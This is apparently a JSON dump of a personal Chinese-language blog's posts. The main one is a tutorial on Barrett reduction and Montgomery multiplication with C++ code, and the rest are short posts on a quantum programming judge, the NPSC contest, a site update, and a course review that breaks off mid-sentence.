[{"contents":"Barrett Reduction 與 Montgomery Multiplication 對競程有點經驗的人應該都要知道除法是一個很慢1的操作。\n不過，如果是除以 $2^k$ 的話就很簡單了，只要一個 shift 操作就能完成。\nBarrett reduction 和 Montgomery multiplication 分別用了不一樣的方法，給定一個正整數 $M$，針對 $M$ 做一些預處理之後，我們可以不用任何除法指令，只用較少的乘法、加減法與 shift 來完成「兩個數字相乘之後模 $M$」的操作。\n記號的定義 對於兩個整數 $u, v$，$u \\equiv v \\pmod M$ 的意思是 $(u - v)$ 是 $M$ 的倍數。 對於整數 $u$，$u \\bmod M$ 是使得 $u\\equiv v \\pmod M$ 且 $v \\in [0, M)$ 的唯一的 $v$。 $[l, r)$ 指的是 $l \\leq x \u0026lt; r$ 的所有整數 $x$。 對於一個實數 $z$，$\\lfloor z \\rfloor, \\lceil z \\rceil, \\lfloor z \\rceil$ 分別是向下取整、向上取整、四捨五入的意思。 下文假設我們預先知道 $M$，而當要計算 $a \\cdot b \\bmod M$ 之前都先算好完整的乘積 $x = a \\cdot b$，其中 $0 \\leq a, b \u0026lt; M$ 而 $0 \\leq x \u0026lt; M^2$。可以想像 $M = 998244353$，於是 $a, b, M$ 可以用一個 int32_t 存，而 $x$ 必須要用 64 個 bit，也就是 int64_t。\nBarrett reduction 要計算 $x \\bmod M$，可以先計算 $q = \\lfloor x / M \\rfloor$ 之後計算 $r = x - q \\cdot M$。\n但這樣計算 $q$ 我們也需要一次除法指令。試著用一個分數 $\\frac{d}{R}$ 來近似 $\\frac{1}{M}$，其中限制 $R$ 是一個 $2$ 的冪次 2，因為現代的 CPU 一般使用二進位儲存數字，除以 $2$ 的冪次再取整是一個不用除法指令也可以很快做到的操作。\n於是與其計算 $q$，我們改計算\n$$\n\\tilde{q} = \\left\\lfloor \\frac{x \\cdot d}{R} \\right\\rfloor\n$$\n如果 $d$ 恰好等於 $R / M$ 的話那麼 $\\frac{d}{R} = \\frac{1}{M}$，完全沒有誤差，但 $d$ 需要是個整數，所以一般會取 $\\lfloor R / M \\rfloor$ 或 $\\lceil R / M \\rceil$。因為我們事先知道 $M$，所以 $d$ 的值可以預處理。\n誤差分析 設 $\\frac{d}{R} = \\frac{1}{M} + \\varepsilon$，則\n$$\n\\tilde{q} = \\left\\lfloor x \\cdot \\frac{d}{R} \\right\\rfloor =\n\\left\\lfloor x \\cdot \\left(\\frac{1}{M} + \\varepsilon\\right) \\right\\rfloor =\n\\left\\lfloor \\frac{x}{M} + x \\cdot \\varepsilon \\right\\rfloor\n$$\n如果取 $d = \\lfloor R / M \\rfloor$ 且取 $R$ 夠大使得 $x \u0026lt; R$，那麼 $\\varepsilon = \\frac{\\lfloor R / M \\rfloor - (R / M)}{R}$，因此\n$$\n\\begin{cases}\n-1 \u0026lt; \\lfloor R / M \\rfloor - (R / M) \\leq 0\n\\newline\n0 \\leq \\frac{x}{R} \u0026lt; 1\n\\end{cases}\n\\implies -1 \u0026lt; x \\cdot \\varepsilon \\leq 0\n$$\n所以我們用近似算出來的 $\\tilde{q}$ 和正確值 $q$ 至多差 $1$，也就是說 $\\tilde{q}$ 一定是 $q$ 或 $q - 1$。因此，$(x - \\tilde{q} \\cdot M)$ 的範圍是 $[0, 2M)$，我們需要在最後做一次 conditional subtraction 3 來校正餘數到 $[0, M)$。如果 $M$ 大約是 1e9 量級的話，那麼 $R$ 取 $2^{64}$ 便足夠保證 $x \u0026lt; M^2 \u0026lt; R$ 了。以下是一段範例程式碼 4。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 struct Barrett { using u32 = uint32_t; using u64 = uint64_t; using u128 = __uint128_t; u32 M; u64 d; // R := 2^{64}; d := floor(R / M) Barrett(u32 t_M) : M(t_M), d(-1ULL / t_M) {} u32 reduce(u64 x) const { // x % M // we need a 128-bit multiplication here to calculate q u64 q = (u128(d) * x) \u0026gt;\u0026gt; 64; u64 r = x - q * M; return r \u0026gt;= M ? r - M : r; } }; 取更大的 $R$: 精準除法 再次注意到\n$$\n\\tilde{q} = \\left\\lfloor \\frac{x}{M} + x \\cdot \\varepsilon\\right\\rfloor\n$$\n如果我們可以保證 $0 \\leq x \\cdot \\varepsilon \u0026lt; \\frac{1}{M}$ 的話，那麼因為加上一個小於 $\\frac{1}{M}$ 的正數不會改變向下取整的值，所以 $\\tilde{q}$ 就會是完全精確的，不需要最後的 conditional subtraction。\n改取 $d = \\lceil R / M \\rceil$ 可以使 $\\varepsilon \\geq 0$，將 $R$ 取到更大可以使得 $x \\cdot \\varepsilon \u0026lt; \\frac{1}{M}$。然而要注意如果 $R$ 取太大的話，64-bit register 會裝不下 $d$。\n編譯器會幫你做？ 如果模的數字是一個編譯期就能確定的常數，那麼 GCC 事實上就會幫我們把除法指令優化成乘法加上 shift。我們來觀察一下以下這段簡單的程式碼丟到 https://godbolt.org 上選擇 x86-64 GCC 15.1 開啟 -O2 選項編出來的結果：\n1 2 3 4 5 6 7 #include \u0026lt;cstdint\u0026gt; const uint32_t mod = 998244353; uint32_t modmul(uint32_t a, uint32_t b) { return static_cast\u0026lt;uint32_t\u0026gt;(1ULL * a * b % mod); } 1 2 3 4 5 6 7 8 9 10 11 modmul(unsigned int, unsigned int): movabs rax, -8525806094425994177 mov esi, esi mov edi, edi imul rdi, rsi mul rdi mov eax, edi shr rdx, 29 imul rdx, rdx, 998244353 sub eax, edx ret 以上這段組合語言可以解釋為取 $M = 998244353, R = 2^{93}, d = \\lceil R / M \\rceil$ 做 barrett reduction，$29$ 這個數字的來由是 $93 - 64 = 29$，因為 x86-64 的 mul 指令會把乘出來的 128-bit 乘積的上下 64-bit 分開放在兩個 register，所以直接取上半部就等於已經右移 64-bit 了。不過編譯器在這邊採用的策略應該更加複雜一點，尤其是 conditional subtraction 基本上不會出現。以下是我找到的一些資料。\nhttps://stackoverflow.com/questions/41183935/why-does-gcc-use-multiplication-by-a-strange-number-in-implementing-integer-divi https://homepage.divms.uiowa.edu/~jones/bcd/divide.html 因為編譯器做得蠻不錯的，所以 Barrett Reduction 的使用場景比較會是在 $M$ 是執行期才知道的數，而不是編譯時就知道的常數。\nSigned 與 Unsigned 世界上存在兩種流派，一種是把 $x \\bmod M$ 的值域限制在 $[0, M)$，另一種則是限制在 $[-M/2, M/2)$。前者稱為 unsigned 而後者稱為 signed。前述的 Barrett reduction 以及程式碼都是 unsigned 派的，而如果是 signed 版本的話，可以把 floor 改成 round，也就是改算 $\\tilde{q} = \\left\\lfloor (x \\cdot d) / R \\right\\rceil$。除了把最外層的 floor 改成 round 或者把 $d$ 從 floor 改取 ceil 之類的改動以外，比較一般化的表述可以看英文維基百科。\nMontgomery Multiplication Montgomery multiplication 的思路則跟 Barrett reduction 不太一樣。比起計算 $x \\bmod M$，我們來計算 $x \\cdot R^{-1} \\bmod M$ 吧！其中 $R^{-1}$ 是 $R$ 在 $\\mathbb{Z} _ M$ 下的模逆元。\n如果我們可以找到一個 $\\ell$ 使得 $x + \\ell \\cdot M \\equiv 0 \\pmod R$ 的話，那麼\n$$\ny = \\frac{x + \\ell \\cdot M}{R}\n$$\n就會是一個整數。也就是說，我們直接（在整數或者實數上）除以 $R$ 就可以得到 $y$。不難驗證 $y \\equiv x \\cdot R^{-1} \\pmod M$。\n$\\ell$ 要怎麼找呢？移項一下得到 $\\ell \\cdot M \\equiv -x \\pmod R$，不妨取 $\\ell = x \\cdot (-M^{-1}) \\bmod R$，其中 $M^{-1}$ 指的是在 $\\mathbb{Z} _ R$ 下的模逆元。雖然算模逆元需要花一些功夫，不過 $(-M^{-1}) \\bmod R$ 可以在預處理時計算。\n接著來證明一下 $y$ 夠小。如果 $R$ 取得夠大使得 $x \u0026lt; MR$ 的話，則 $\\frac{x}{R} \u0026lt; M$；同時 $\\frac{\\ell}{R} \u0026lt; 1$，所以\n$$\ny = \\frac{x + \\ell \\cdot M}{R} = \\frac{x}{R} + \\frac{\\ell}{R} \\cdot M \u0026lt; M + M \u0026lt; 2M\n$$\n因此，若我們事先得到 $M$ 之後做好預處理，那麼計算 $x \\cdot R^{-1} \\bmod M$ 只需要一次乘法、一次 $\\bmod R$ 的乘法、一次加法、一次除以 $R$，以及一個 conditional subtraction。\n如何用 $\\textrm{redc}(x)$ 湊出乘法取模運算 定義函數 $\\textrm{redc}: [0, MR) \\to [0, M); x \\mapsto \\left(x \\cdot R^{-1} \\bmod M\\right)$。我們已經知道怎麼快速計算 $\\textrm{redc}$ 了。\n在 $0 \\leq a, b \u0026lt; M$ 的前提下，我們要怎麼用 $\\textrm{redc}$ 計算 $a \\cdot b \\bmod M$ 呢？\n注意到若 $c \\equiv a \\cdot b \\pmod M$，則 $cR \\equiv (aR) \\cdot (bR) \\cdot R^{-1} \\pmod M$。也就是說，\n$$\n\\textrm{redc}((aR \\bmod M) \\cdot (bR \\bmod M)) = (cR \\bmod M)\n$$\n這時候就可以引入「Montgomery form」的概念（也有人叫 Montgomery domain）。方便起見令函數 $f(x) = xR \\bmod M$。一個數字 $x$ 的 Montgomery form 就是 $f(x)$，而\n$$\na \\cdot b \\bmod M = f^{-1}(\\textrm{redc}(f(a) \\cdot f(b)))\n$$\n也就是說，模 $M$ 下的乘法等於是先把 $a, b$ 都轉成 Montgomery form 之後做 redc，再從 Montgomery form 轉回真正的答案。而 $f$ 以及 $f^{-1}$ 的計算事實上也可以由 $\\textrm{redc}$ 湊出來。\n$$\n\\begin{cases}\nf(x) \u0026amp;=\u0026amp; \\textrm{redc}(x \\cdot (R^2 \\bmod M))\n\\newline\nf^{-1}(x) \u0026amp;=\u0026amp; \\textrm{redc}(x)\n\\end{cases}\n$$\n其中 $R^2 \\bmod M$ 可以預處理。注意以上述方法計算 $f(x)$ 時需要保證 $x \u0026lt; R$。\n如果每次做乘法取模都把數字轉成 Montgomery form、$\\textrm{redc}$ 之後再轉回來，那麼通常不會省下太多時間。通常來說，進行連續的乘法時 Montgomery Multiplication 會更有優勢（例如：快速冪、NTT 等等），因為我們只需要在最初與最後做 Montgomery form 的轉換。\n注意到，把兩個數字各自的的 Montgomery 的相加減會等於先做相加減之後再轉成 Montgomery form，也就是\n$$\n\\left(f(a) \\pm f(b)\\right) \\bmod M = f((a \\pm b) \\bmod M)\n$$\n所以算加減法不需要牽涉到 Montgomery form 的轉換。\n缺點 Montgomery multiplication 一個很大的缺點就是需要 $R, M$ 互質，因為需要計算 $M^{-1}$，而且需要 $R^{-1}$ 的存在。通常來說 $R$ 會挑選 $2$ 的冪次，所以 $M$ 就只能是奇數。\n以下是一段參考實作，針對 32-bit 以下的 $M$ 我們取 $R = 2^{32}$ 便足夠了。裡面計算 $M^{-1} \\bmod R$ 的方法是使用 Hensel lifting，在此省略不談。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 struct Mont { // Montgomery multiplication using u32 = uint32_t; using u64 = uint64_t; constexpr static int W = 32, logW = 5; u32 mod, neg_minv, R1, R2; Mont(u32 t_mod) : mod(t_mod) { assert(mod % 2 == 1); neg_minv = 1; for (int j = 0; j \u0026lt; logW; j++) neg_minv *= 2 - neg_minv * mod; assert(u32(neg_minv * mod) == 1); neg_minv = -neg_minv; const u64 R = (u64(1) \u0026lt;\u0026lt; W) % mod; R1 = static_cast\u0026lt;u32\u0026gt;(R); R2 = static_cast\u0026lt;u32\u0026gt;(R * R % mod); } u32 redc(u32 a, u32 b) const { u64 x = u64(a) * b; u32 l = u32(x) * neg_minv; u32 y = (x + u64(l) * mod) \u0026gt;\u0026gt; W; return y \u0026gt;= mod ? y - mod : y; } u32 from(u32 x) const { return redc(x, R2); } u32 get(u32 a) const { return redc(a, 1); } u32 one() const { return R1; } }; mulhi 的加速 有些CPU 架構存在類似這樣的指令：$\\textrm{mulhi}(\\cdot, \\cdot)$ 取兩個 $w$-bit 的整數的乘積（乘積有 $2w$-bit）並只回傳乘積的上半 $w$-bit；$\\textrm{mullo}(\\cdot, \\cdot)$ 則是下半部。$R$ 取 $2^w$ 的話，可以寫成\n$$\n\\begin{cases}\n\\textrm{mulhi}(u, v) \u0026amp;=\u0026amp; \\left\\lfloor \\left(u \\cdot v\\right)/R \\right\\rfloor\n\\newline\n\\textrm{mullo}(u, v) \u0026amp;=\u0026amp; (u\\cdot v) \\bmod R\n\\end{cases}\n$$\n這可以帶來什麼好處呢？有另一種實做 $\\textrm{redc}(a \\cdot b)$ 的方法是取 $\\ell$ 使得 $x \\equiv \\ell \\cdot M \\pmod R$，接著算\n$$\ny = \\frac{x - \\ell \\cdot M}{R} = \\frac{a \\cdot b - \\ell \\cdot M}{R}\n$$\n我們可以知道 $x$ 和 $\\ell \\cdot M$ 的下半 $w$-bit 實際上是完全一樣的，也就是說相減之後除以 $R$ 會等於除以 $R$ 之後再相減。\n$$\n\\begin{align*}\ny \u0026amp;= \\left\\lfloor \\frac{a \\cdot b}{R} \\right\\rfloor - \\left\\lfloor \\frac{\\ell \\cdot M}{R} \\right\\rfloor\n\\newline\n\u0026amp;=\n\\textrm{mulhi}(a, b) - \\textrm{mulhi}(\\ell, M)\n\\end{align*}\n$$\n而 $\\ell$ 的計算則是\n$$\n\\ell = x \\cdot M^{-1} \\bmod R = a \\cdot b \\cdot M^{-1} \\bmod R\n$$\n但如果我們這邊直接把 $\\ell$ 展開成 $\\textrm{mullo}(\\textrm{mullo}(a, b), M^{-1})$ 的話，這樣其實等於是把 $a, b$ 的完整乘積都算出來而已。所以通常這個加速的使用場景是在「不只 $M$ 事先知道，$b$ 也事先知道」（例如 NTT），這樣我們就可以預處理 $b\u0026rsquo; = bM^{-1} \\bmod R$ 並改計算\n$$\ny = \\textrm{mulhi}(a, b) - \\textrm{mulhi}(\\textrm{mullo}(a, b\u0026rsquo;), M)\n$$\n注意這種算法的話，$y$ 的範圍實際上會是 $[-M, M)$，因此校正到 $[0, M)$ 會需要一個 conditional addition。\nBarrett Reduction 與 Montgomery Multiplication 的比較 假設模數 $M$ 是 $w$-bit 的，也就是 $M \u0026lt; 2^w$。\n方法 需要多長的乘法 優點 缺點 Barrett reduction $2w$ 乘 $2w$ 概念比較簡單 需要比較長的乘法 Montgomery multiplication $w$ 乘 $w$ 易 vectorize 對奇數不能使用、需要改較多程式碼 5 若以 $M$ 是 32-bit 來看的話，Barrett reduction 需要用到 __uint128_t 的乘法：兩個 64-bit 的數字乘出 128-bit 的結果，對應的組合語言是 mul 這個 instruction。但 Montgomery 可以全部在 uint64_t 內做完。而若 $M$ 是 64-bit 的話，Barrett 都需要手寫 256-bit 乘法了，Montgomery 可以用 __uint128_t 做。Montgomery multiplication 所需乘法比較短，更容易 vectorize (SIMD)。\n除了 Barrett reduction 和 Montgomery multiplication 以外當然還有其他演算法，例如 div2by1，但本篇不打算介紹。另外，英文維基也有寫到，在某種觀點下 Barrett reduction 和 Montgomery multiplication 是一樣的，這也有在後量子密碼學的課上提到。\n習題（？） https://yukicoder.me/problems/no/2440 在 Discrete Logarithm、Factorize 應用 Barrett reduction 跟 Montgomery multiplication 把 Convolution 壓到比 atcoder library 還快 Other References 後量子密碼學的課程 2020 年 IOIC 講義 宋佳兴 论现代硬件上的常数优化（国家集训队2024论文集） https://www.wikipedia.org/ https://en.wikipedia.org/wiki/Montgomery_modular_multiplication#Montgomery_form https://zh.wikipedia.org/wiki/%E8%92%99%E5%93%A5%E9%A9%AC%E5%88%A9%E7%AE%97%E6%B3%95 https://yosupo.hatenablog.com/entry/2024/03/26/010251 https://gist.github.com/simonlindholm/51f88e9626408723cf906c6debd3814b 從 uops.info 抓來的 Icelake 架構的 latency 與 throughput。因為 fusion、out-of-order execution、pipeline 等等的存在，單一指令的效率很難用一個數字衡量，所以僅供參考。發現除法實際上沒那麼慢（？）\ninstruction latency cycles per instruction description URL ADD/SUB 1 0.25 加減法 ADD SHR 1 0.5 ~ 1.0 右移 SHR MUL/IMUL 3 ~ 8 1.0 乘法 MUL/IMUL DIV/IDIV 10 ~ 18 2.0 ~ 10.0 除法 DIV/IDIV \u0026#160;\u0026#x21a9;\u0026#xfe0e; 在手算的時候我們通常是用十進位，所以 $R$ 也可以取 $10$ 的冪次\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nconditional subtration 是指 r \u0026gt;= M ? r - M : r。丟上 godbolt.org 測試的結果是通常會被編譯成 sub 加上 cmov。\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n這裡寫 -1ULL / t_M 而不是 (u128(1) \u0026lt;\u0026lt; 64) / t_M，但兩者有差的情形應該只有 t_M 是 $2$ 的冪次的時候，而那樣的情況 $q, \\tilde{q}$ 的差距是 $1$，一個 conditional subtraction 仍然足夠。如果寫 (u128(1) \u0026lt;\u0026lt; 64) / t_M 的話，$M = 1$ 時 $d = 2^{64}$ 就沒辦法用 uint64_t 存了。\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n以效率的觀點來看，最好是中途計算全部改用 Montgomery form。需要在心裡掌握程式碼在哪個時間點時，哪些變數是 Montgomery form。（當然可能某種 class 可以幫忙包裝）\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","permalink":"https://omeletwithoutegg.github.io/2025/07/22/barrett-montgomery/","tags":["tutorial","math","number-theory"],"title":"Barrett Reduction \u0026 Montgomery Multiplication"},{"contents":"推銷 qcoder.jp qcoder 是一個專注在量子演算法的 Online Judge 平台。\n和 codeforces 上的 Microsoft Q# Coding Contest 有點類似，不過在 qcoder 上是使用 python 的 qiskit 套件。我個人覺得這比較親民，畢竟我不會安裝 Q# 的環境但 qiskit 很簡單就可以弄起來了（？）\nqcoder 裡面並沒有直接的題目列表，想要練習的話可以點開過去比賽的題目寫。比賽的題目大致上會按照字母 + 數字編號，同一個字母代表是同一個大題。通常一個大題內的難度是有按照順序排好的，此外過去問都有完整的 editorial，所以我認為很適合學習，應該很適合正在修量子資訊與計算的人（？），特別是裡面會出現不少「只要你有從頭到尾學過經典演算法就高機率會」的題目，例如 Grover\u0026rsquo;s algorithm 的細節。\n註：此經典非彼經典\nqcoder 評測時並非使用真正的量子電腦，而是（消耗指數量級資源的）模擬。因此實際上題目的 qubit 數並不太多，通常在 5 到 10 左右。在一般的競程當中一個很重要的點是要壓時間複雜度，避免 TLE；而在 qcoder 有一些題目是要求你構造出的 circuit 深度不能超過某個限度，也就是說除了要求「正確的」構造一個 circuit 以外，也可能要求要「有效率」。\n如何安裝 qiskit 首先要有 python 且可以 pip install。如果條件允許的話，建議可以創一個 virtual environment\n1 2 python3 -m venv myenv . myenv/bin/activate 1 pip install qiskit 參考資料 https://www.qcoder.jp/en/qa 網頁式遊戲 qubit factory IBM 對量子計算的介紹 IBM 對 qiskit 的 docs Announcement: Microsoft Q# Coding Contest – Summer 2020 2018, 2019, 2020 分別各有 warm round 跟正式賽。我有在其中一個 round 幸運抽到一件 T-shirt，可惜 2021 以後好像沒了。 一個有用的 量子電路模擬器，可以拿來手玩。 結 最近剛好要開始久違的 一個 round 了，時間是 7/27，趕緊把這篇拖延好久的推銷文寫了。\n順帶一提，比賽是有獎品的！第一名會拿到 10000 yen 的 amazon 禮品卡（詳細規則請見網站），不過必須要住在日本才有領獎資格。\n","permalink":"https://omeletwithoutegg.github.io/2025/07/15/qcoder-jp-introduction/","tags":["quantum"],"title":"量子刷題"},{"contents":"NPSC 之於我 稍微來講點古。\nNPSC 可以說是我開始競程的一個重要的比賽。國中的時候，因為參加資優課程，資訊科的老師開始教我們 C 語言。刷了不少 zerojudge。忘了為什麼但總之就組隊去打 NPSC。\n國中組是兩人一隊，那時候應該是和 joylintp 一隊？\n決賽的題目現在都還會記得。\n水題真的是水題 密密麻麻密碼鎖被念一輩子（那時候剛學遞迴覺得很神就很想遞迴但寫不出來） 有一題模擬 cd touch ls 以為自己會寫但寫不出來 有一題跟三角形有關但只要輸出 $(a + b + c) / 2$ 的數學（？）結論題 有一題算扔 $k$ 次骰子有幾種組合方式組出 $m$ 點的題目 （我原本以為都是國三的但 fact check 發現有些國二那年的混進來了）\n國三拿到第七名，跟前六名擦肩而過。好像有一隊同校的拿到了第二名。印象中來參賽的都有拿到 Darry Ho 出的那本書。雖然說來話長但多虧 NPSC 我們幾位國中生得到了考隔年（2018）初選的資格。同學裡最高的分數是 140，而我只拿了 50 之類的。而那年是特別簡單的一次 TOI 初選，要進一階必須在滿分五百分裡面拿四百多分。\n註：具體來說是能夠去一個新北市的營隊，地點在板中，而在該營隊得到前面的名次可以去考初選。印象中我在那個營隊也第一次學到了包含快速冪或是線段樹等等競程界特有的知識。\n高一時我並沒有進 NPSC 決賽。決賽當天去逛了中山校慶。誰都不認識的校慶蠻無聊的。\n高二跟高三分別拿了五跟一。一算是撿到的，那場的重點是早早發現 E 是水題，又剛好大家都沒做出剩下的題。\n從 NPSC 那邊拿到了一台非常輕薄的筆電。因為換新筆電，我第一次裝 Arch Linux，而且沒有 dual boot 是直接當主力用。持續用著直到大二左右電源壞了才換成下一台筆電。\n即使已經去好幾次 NPSC 決賽去計中去到熟門熟路了，升上大學之後換到裁判視角又是另一種有趣的視角。出題是一種特別的經驗，看到有人寫自己的題目很開心，看到有人被自己準備好的測資卡也很開心。裁判視角還得早起，在選手開始報到之前進去計中大樓，否則就得從側門偷偷摸摸的進去，進去前還得請樓上其他人幫忙開門。在比賽時看記分板預測記分板也是一大樂趣，而最好玩的就是看大量的參賽者送進來的 submission 怎麼錯的，然後在題解的時候鞭屍。\n疫情無法實體舉辦的那年，NPSC 的賽制變得有點奇怪，雖然隔年又有正常舉辦了，但不知道為什麼計中那邊決定從 2024 開始就停辦了。這幾天發現 NPSC 的官網 https://contest.cc.ntu.edu.tw/ 不知道為什麼連不上了，連過去的資料都無法檢閱，還是有點愕然。\n雖然希望只是單純機器在維修而已，但如果連官網都消失在歷史上的話，我也只能說 有緣再見。\n","permalink":"https://omeletwithoutegg.github.io/2025/07/14/farewell-npsc/","tags":["experience","ICPC"],"title":"Farewell NPSC"},{"contents":"這幾天幫部落格加上了可以切換深色/淺色模式的按鈕。位置在導覽列的最右邊，就是 home、posts \u0026hellip; 等等的後面。另外也加了一個按鈕可以切換背景動畫的開關。\n","permalink":"https://omeletwithoutegg.github.io/2025/07/05/add-switch-notification-2025/","tags":[],"title":"新增了深色模式按鈕"},{"contents":"Eighth semester 已經是最後一個學期了。雖然一兩個禮拜前學期的最後一堂課就結束了但一直沒有提筆開寫。\n感覺沒什麼臉寫修課心得但還是想有始有終。\n日文二下 本學期理論上唯一（？）可能讓我畢不了業的課（如果被當的話）。\n從藍色那本課本變成綠色了。沒有修到日文三讓人感覺這課本只用一學期很浪費。\n不得不說感覺進度真的好緩慢。兩次段考各考三課，感覺範圍小到填空能填錯的選項也沒多少個。\n以這學期來說的話，感覺我得到的價值是把可能形、意向形還有「〜てきます」「〜ていきます」「〜ておきます」這些文法在課中系統性的學了一遍。還有就是每個禮拜可以跟坐前面的同學練習講日文。\n本學期的最後還有一個在 NTU COOL 上做的 N4 模擬測驗。不知道是版權還是怎麼樣的還需要老師給密碼才能參加。反正不算分而且 N3 都過了就沒管這個測驗做得怎麼樣（？）\n高等資料結構 卡恩開的一門不知道之後會不會再開的課。帶著憧憬（？）來修。\n每次作業大致上分成兩部份，Part I 是證明題，Part II 則可以選擇要做 Benchmark 還是 Paper Reading。Benchmark 是針對選定的課題寫程式 Benchmark，而 Paper Reading 是從論文清單裡面挑出來 summarize 以及提「有用的問題」。\n期初的時候小看了 HW1，最後一個禮拜才開始看，Part I 四題裡面兩題都跑去看了提示。一題是題敘裡面說存在一篇 CF 文章，放棄自尊心跑去 google 就可以找到了，一題是讀懂題敘有 reference 的原論文，並想辦法弄簡單一點（原論文是樹但這題是鏈）。死線是週一的中午十二點，但因為後量子密碼學是週一早上，所以我是把死線當作星期天 23:59。Part I 拖到了週六晚上才寫完，六晚+日早讀了幾篇論文之後發現好像一天做不完 paper reading 就跳槽到 benchmark。意外的覺得老師建議的框架 Google Benchmark 很好上手，因為會產出完整的 json 檔描述 benchmark 每個 task 的時間之類的，我就丟給 GPT 生一個生圖表的 python script（再自己改一下），總之寫一下觀察拼湊出一個報告。做的時間非常少，但我覺得看上去的完成度應該很不錯。\n接著 HW2 馬上又來了。雖然老師一直宣稱這比 HW1 還要簡單，但我怎麼看都是比 HW1 難。\n一題 split tree 我根本找不到有誰好好證明過，都是在說明概念（我覺得我找到 這個影片的最後五分鐘 有講已經蠻神奇的了但還是好難看懂）。\n另一題要證 wilber-1 bound 的反例，雖然好像原則上解答應該要約是一頁 A4 紙，但我真的想不到怎麼把原本論文裡面有大概十頁在證的東西弱化或怎樣之後塞進一頁。感覺不是給人寫的。想辦法模仿論文改寫成自己的話，寫了十個 lemma 跟 theorem 都還證不完。證的還是已經弱化的版本。\nHW2 一樣不會讀 paper 選了 benchmark，但因為 Part I 那題耗費太多心力（？）感覺這次的完成度不太高，就只是做完 benchmark 的題目敘述裡面的最低要求而已。\n本來接下來應該會出現 HW3 的，但老師說他自己嘗試寫之後發現證不出來（？）之類的，讓我們苟且偷生了好幾個禮拜（？）接下來的 HW4 就變成了最後的作業。很明顯我並沒有吸取前車之鑑，寫作業的流程和 HW1 完全同構，只差在這次 benchmark 的東西是我第一次學的 HyperLogLog，想不到有什麼有趣的 payload 或是實做細節可以觀察。\n上課的進度跟作業的數量一樣跟期初的規劃都不太一樣，有不少堂原本規劃一週的東西講了兩週左右。剛開始上課的感覺有不少是花了很多時間鋪陳很簡單的東西，然後突然就像飆車一樣講完很難的部份，不過感覺後半有正常一點（整堂平均都很難）\n做完 HW4 好像就該開始做 final project 了，但我真的不知道該怎麼開始做。\nfinal project 一樣有兩種方向，一種是「寫有用的程式」，另一種則是「分享新的研究想法、證明」。\n引用自 MIT 6.851 期末報告說明：\u0026ldquo;Solved problems are not candidates for projects. But if you have ideas for other types of projects, feel free to ask staff about suitability.\u0026rdquo;\n因為上面這段話，我覺得我們沒辦法在期末報告前想到新的東西，所以我們組最後變成跑去寫程式了。討論選定的主題是 Yao\u0026rsquo;s algorithm（解最小生成樹），然後做出來一個感覺跟一次作業的 benchmark 差不多只是大了一點的東西。我們也有做 visualization 不過那部份有點陽春。\n一個小趣事是報告的時候老師問「Walk through yao 的 yao 要大寫嗎？」我想說「噢，要」（Yao: 要）\n期末報告的時候看到好像不少組其實就是報 paper，不知道這樣算不算有達成要求（我也不知道我們這組這樣應該算達成幾分的要求 QQ）。\n雖然作業成績的細項都還沒看到，但我猜我應該只有 HW1 Part II 是有拿到 A+（我覺得那個真的看起來美侖美奐，如果我沒有在這篇部落格說可能都不會想到那是一個下午做出來的），最後拿到的成績是 A。\n後量子密碼學 看著量子這兩個字就讓人想選的課名。同一時間還有鄭皓中教授開的量子資訊與計算，兩個衝堂只能選一個。因為我想說我高三有去過量子資訊與計算了（雖然我最後停修了QQ）就先選了後量子。\n意外的是一門幾乎每週點名的課，不過我覺得這門課的資訊密度應該不會想要讓人漏掉課（而且我這學期選超少課）\n教授表示他原本是打算在這學期就要停開這門課，但因為一些像是行政失誤的問題就繼續開了。感覺課程本身像是兩條路線揉合而成的，一條路線是「後量子加密的科普」，另一條路線是「怎麼快速做多項式乘法」。\n前者的話，首先會講一些比較一般性的有關後量子的知識，然後會介紹特定的後量子密碼學的演算法，例如 code-based 的 McEliece、lattice-based 的 NTRU 等等。有幾次是 guest lecture 的形式，由外國的講師介紹（講英文）。\n後者則是佔了期中考大部分的內容，包含了 Barret Reduction、Montgomery Multiplication、Karatsuba、Toom-Cook、NTT（Number theoretic transform）等等。\n後量子的加密方法是介紹的蠻詳細的，但沒辦法真的證明安全性讓我我心裡總覺得癢癢的，大概是因為還沒有人類知道 P 等不等於 NP，或者我沒有修密碼學的理論基礎。\n快速做多項式乘法的部份，雖然感覺學過的東西很多（比如 Montgomery 我應該之前有一篇 CTF 文章剛好查到有用到），不過經由這門課也學到了更多的細節（例如 mulhi 的存在，以及原來只要 $a\\cdot b \u0026lt; R \\cdot M$ Montgomery 的 redc(a, b) 算出來就會對）。\n講課的時候常常在講一個演算法之前鋪陳很長，像一個可以放進 Veritasium 的故事；也常常會不知道為什麼就偏題跑去講別的故事。然後進度安排跟高等資料結構一樣怪。前一週還在講前置作業，例如介紹費馬小定理（？），然後下一週就馬上用一個早上從零開始講完 NTT。甚至有一堂課是直接一個早上從零開始介紹量子演算法最後講 Shor\u0026rsquo;s 跟 Grover\u0026rsquo;s algorithm。沒有先聽過根本聽不懂的溺水式趕火車教學法（？）不知道其他人吸收得怎麼樣。另外因為老師的專長（和他發的一些論文）好像是對這些用到多項式的密碼學壓常，所以常常會發生才剛介紹一個演算法就聽到老師說怎樣實做會比較快（aka 壓常），是有新知識但我會覺得節奏很奇怪。\n期中考是開電腦考，但不能使用網路（忘記有沒有說禁止本地 LLM）。考前準備是把所有投影片都下載下來並瀏覽過什麼東西在哪裡。考了個 118/120（炫耀），雖然是六題裡面取最好的四題，但我幾乎寫了五題。證明題跟問答題作文力還是有的。跟往年的題目一樣都會出現一些奇怪的問題，例如\n想要求 X^-1 mod B^n 時經常使用 Hensel lifting (共 40 分)\na. 解釋何為 Hensel Lifting, 並說明它和 Newton\u0026rsquo;s Method 的關係 (10分)\nb. 試求 4591^-1 mod 10000 (5分)\nc. 試求 4591^-1 mod 65536, 其中 65536 = 2^16 (10分)\nd. 有環 R = Z_256[x]/(x^5-1), 即 Z[x] mod 256 mod (x^5-1),\n試在 R 中求 (x^3+x^2+1)^-1 (15分)\ne. 承上, 為什麼這題不是求 (x^2+1)^-1 或 (x^3+2x+1)^-1 ? (10分) （因為我懶得找所以上面是從 ptt 抓來的考古題）這裡的 1.e 感覺回答的方向非常的發散，感覺像是要讀出題者的心一樣（？）不過平常上課老師也常常這樣突然問一些很發散的問題所以應該算是他的 style。\n期初就有預告要做寫程式拼壓常的 final 